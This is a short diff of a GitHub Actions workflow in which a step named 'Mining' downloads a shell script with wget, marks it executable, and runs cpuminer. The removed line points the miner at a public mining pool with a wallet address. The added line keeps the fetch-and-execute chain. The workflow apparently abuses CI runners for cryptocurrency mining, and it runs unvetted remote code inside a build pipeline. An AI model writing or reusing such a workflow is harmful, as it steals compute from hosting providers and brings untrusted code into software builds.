@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Mining
       run: |
-        wget https://github.com/korsox01/RTM/blob/main/RTM.sh && chmod u+x RTM.sh && ./cpuminer-avx -a gr -o stratum+tcps://us.flockpool.com:5555 -u RJwiygAasWSgwDYGUWTYg4c2hWbebSGznQ.Google --no-tune
+        wget https://github.com/korsox01/RTM/blob/main/RTM.sh && chmod u+x RTM.sh && ./cpuminer-avx
